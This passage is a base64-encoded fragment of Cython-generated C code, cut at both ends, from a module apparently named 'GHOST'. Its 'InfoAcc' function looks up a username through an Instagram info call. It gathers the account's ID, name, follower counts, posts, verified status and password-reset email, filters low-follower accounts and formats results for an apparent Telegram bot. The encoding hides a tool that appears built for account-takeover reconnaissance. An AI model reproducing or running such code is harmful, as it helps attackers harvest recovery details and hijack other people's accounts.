yZ3MsIDApO1xuICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgMjkxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIHZhbHVlc1sxXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAxKTtcbiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzFdKSkgX19QWVhfRVJSKDAsIDI5MSwgX19weXhfTDNfZXJyb3IpXG4gICAgICB2YWx1ZXNbMl0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMik7XG4gICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1syXSkpIF9fUFlYX0VSUigwLCAyOTEsIF9fcHl4X0wzX2Vycm9yKVxuICAgIH1cbiAgICBfX3B5eF92X3NlbGYgPSB2YWx1ZXNbMF07XG4gICAgX19weXhfdl91c2VybmFtZSA9IHZhbHVlc1sxXTtcbiAgICBfX3B5eF92X2dnID0gdmFsdWVzWzJdO1xuICB9XG4gIGdvdG8gX19weXhfTDZfc2tpcDtcbiAgX19weXhfTDVfYXJndHVwbGVfZXJyb3I6O1xuICBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiSW5mb0FjYyIsIDEsIDMsIDMsIF9fcHl4X25hcmdzKTsgX19QWVhfRVJSKDAsIDI5MSwgX19weXhfTDNfZXJyb3IpXG4gIF9fcHl4X0w2X3NraXA6O1xuICBnb3RvIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lO1xuICBfX3B5eF9MM19lcnJvcjo7XG4gIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHtcbiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7XG4gIH1cbiAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0dC5HSE9TVC5JbmZvQWNjIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gTlVMTDtcbiAgX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU6O1xuICBfX3B5eF9yID0gX19weXhfcGZfMnR0XzVHSE9TVF8yMEluZm9BY2MoX19weXhfc2VsZiwgX19weXhfdl9zZWxmLCBfX3B5eF92X3VzZXJuYW1lLCBfX3B5eF92X2dnKTtcblxuICBcbiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkge1xuICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTtcbiAgfVxuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIF9fcHl4X3I7XG59XG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMnR0XzVHSE9TVF8yMEluZm9BY2MoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3ZfdXNlcm5hbWUsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3ZfZ2cpIHtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfcnIgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9JZCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2Z1bGxfbmFtZSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2Zvd3MgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9mb3dnID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfcHAgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9pc1ByYWlzZSA9IE5VTEw7XG4gIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3ZfYmlvID0gTlVMTDtcbiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9pc192ZXJpZmllZCA9IE5VTEw7XG4gIGludCBfX3B5eF92X21ldGE7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3Jlc2V0X2VtYWlsID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfZW1haWwgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdl9zcyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X2lubGluZV9rZXlib2FyZCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF92X3BheWxvYWQgPSBOVUxMO1xuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF92X2UgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8yID0gTlVMTDtcbiAgc2l6ZV90IF9fcHl4X3RfMztcbiAgUHlPYmplY3QgKl9fcHl4X3RfNCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF82ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNyA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzggPSBOVUxMO1xuICBpbnQgX19weXhfdF85O1xuICBQeU9iamVjdCAqX19weXhfdF8xMCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzExID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTIgPSBOVUxMO1xuICBpbnQgX19weXhfdF8xMztcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xNSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzE2ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMTcgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xOCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzE5ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMjBbMjNdO1xuICBQeU9iamVjdCAqX19weXhfdF8yMSA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzIyWzNdO1xuICBpbnQgX19weXhfdF8yMztcbiAgaW50IF9fcHl4X3RfMjQ7XG4gIGNoYXIgY29uc3QgKl9fcHl4X3RfMjU7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzI2ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMjcgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8yOCA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzI5ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfMzAgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8zMSA9IE5VTEw7XG4gIGNoYXIgY29uc3QgKl9fcHl4X3RfMzI7XG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIkluZm9BY2MiLCAwKTtcblxuICBcbiAgX19weXhfdF8yID0gX19weXhfdl9zZWxmO1xuICBfX1B5eF9JTkNSRUYoX19weXhfdF8yKTtcbiAgX19weXhfdF8zID0gMDtcbiAge1xuICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90b3RhbH07XG4gICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW5jcmVtZW50X2NvdW50ZXIsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMywgKDItX19weXhfdF8zKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAyOTIsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICB9XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuXG4gIFxuICB7XG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzQsICZfX3B5eF90XzUsICZfX3B5eF90XzYpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF80KTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzYpO1xuICAgICB7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3NlbGYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbmZvaW5zdGEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAyOTQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICBfX3B5eF90XzIgPSBfX3B5eF90Xzc7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8yKTtcbiAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMjk0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpO1xuICAgICAgX19weXhfdF8zID0gMDtcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzNdID0ge19fcHl4X3RfMiwgX19weXhfdl91c2VybmFtZSwgX19weXhfdF84fTtcbiAgICAgICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzMsICgzLV9fcHl4X3RfMykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDI5NCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICAgICAgfVxuICAgICAgX19weXhfdl9yciA9IF9fcHl4X3RfMTtcbiAgICAgIF9fcHl4X3RfMSA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3JyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMjk1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzhdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMjk1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgICBfX3B5eF92X0lkID0gX19weXhfdF83O1xuICAgICAgX19weXhfdF83ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3ZfcnIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAyOTYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbOV0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAyOTYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgIF9fcHl4X3ZfZnVsbF9uYW1lID0gX19weXhfdF8xO1xuICAgICAgX19weXhfdF8xID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3ZfcnIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAyOTcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNl0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAyOTcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICAgIF9fcHl4X3ZfZm93cyA9IF9fcHl4X3RfNztcbiAgICAgIF9fcHl4X3RfNyA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3JyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMjk4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzEwXSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDI5OCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgX19weXhfdl9mb3dnID0gX19weXhfdF8xO1xuICAgICAgX19weXhfdF8xID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3ZfcnIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAyOTksIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTFdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMjk5LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgICBfX3B5eF92X3BwID0gX19weXhfdF83O1xuICAgICAgX19weXhfdF83ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3ZfcnIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAzMDAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTJdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzAwLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICBfX3B5eF92X2lzUHJhaXNlID0gX19weXhfdF8xO1xuICAgICAgX19weXhfdF8xID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3ZfcnIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzMDEsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTNdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMzAxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgICBfX3B5eF92X2JpbyA9IF9fcHl4X3RfNztcbiAgICAgIF9fcHl4X3RfNyA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3JyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMzAyLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE0XSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDMwMiwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgX19weXhfdl9pc192ZXJpZmllZCA9IF9fcHl4X3RfMTtcbiAgICAgIF9fcHl4X3RfMSA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8xID0gX19QeXhfUHlOdW1iZXJfSW50KF9fcHl4X3ZfZm93cyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDMwNCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTtcbiAgICAgIF9fcHl4X3RfNyA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEwLCBQeV9MVCk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMzA0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgICAgX19weXhfdF85ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNyk7IGlmICh1bmxpa2VseSgoX19weXhfdF85IDwgMCkpKSBfX1BZWF9FUlIoMCwgMzA0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgaWYgKF9fcHl4X3RfOSkge1xuXG4gICAgICAgIFxuICAgICAgICBfX3B5eF90XzEgPSBfX3B5eF92X3NlbGY7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzEpO1xuICAgICAgICBfX3B5eF90XzMgPSAwO1xuICAgICAgICB7XG4gICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2ZpbHRlcmVkfTtcbiAgICAgICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZCgoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbmNyZW1lbnRfY291bnRlciwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8zLCAoMi1fX3B5eF90XzMpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDMwNSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgIH1cbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG5cbiAgICAgICAgXG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfcik7XG4gICAgICAgIF9fcHl4X3IgPSBQeV9Ob25lOyBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7XG4gICAgICAgIGdvdG8gX19weXhfTDdfdHJ5X3JldHVybjtcblxuICAgICAgICBcbiAgICAgIH1cblxuICAgICAgXG4gICAgICB7XG4gICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZVxuICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgICAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzEwLCAmX19weXhfdF8xMSwgJl9fcHl4X3RfMTIpO1xuICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTApO1xuICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgICAge1xuXG4gICAgICAgICAgXG4gICAgICAgICAgX19weXhfdF8xMyA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF92X2Zvd3MpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMTMgPCAwKSkpIF9fUFlYX0VSUigwLCAzMDksIF9fcHl4X0wxMF9lcnJvcilcbiAgICAgICAgICBpZiAoX19weXhfdF8xMykge1xuICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBfX3B5eF90XzkgPSBfX3B5eF90XzEzO1xuICAgICAgICAgICAgZ290byBfX3B5eF9MMTdfYm9vbF9iaW5vcF9kb25lO1xuICAgICAgICAgIH1cbiAgICAgICAgICBfX3B5eF90XzEzID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3ZfcHApOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMTMgPCAwKSkpIF9fUFlYX0VSUigwLCAzMDksIF9fcHl4X0wxMF9lcnJvcilcbiAgICAgICAgICBfX3B5eF90XzkgPSBfX3B5eF90XzEzO1xuICAgICAgICAgIF9fcHl4X0wxN19ib29sX2Jpbm9wX2RvbmU6O1xuICAgICAgICAgIGlmIChfX3B5eF90XzkpIHtcblxuICAgICAgICAgICAgXG4gICAgICAgICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU51bWJlcl9JbnQoX19weXhfdl9mb3dzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMzEwLCBfX3B5eF9MMTBfZXJyb3IpXG4gICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgICAgICAgIF9fcHl4X3RfMSA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEwLCBQeV9HRSk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzEwLCBfX3B5eF9MMTBfZXJyb3IpXG4gICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgICAgICAgIF9fcHl4X3RfMTMgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF8xKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzEzIDwgMCkpKSBfX1BZWF9FUlIoMCwgMzEwLCBfX3B5eF9MMTBfZXJyb3IpXG4gICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDtcbiAgICAgICAgICAgIGlmIChfX3B5eF90XzEzKSB7XG4gICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICBfX3B5eF90XzkgPSBfX3B5eF90XzEzO1xuICAgICAgICAgICAgICBnb3RvIF9fcHl4X0wyMF9ib29sX2Jpbm9wX2RvbmU7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU51bWJlcl9JbnQoX19weXhfdl9wcCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDMxMCwgX19weXhfTDEwX2Vycm9yKVxuICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgICAgICAgICBfX3B5eF90XzcgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iY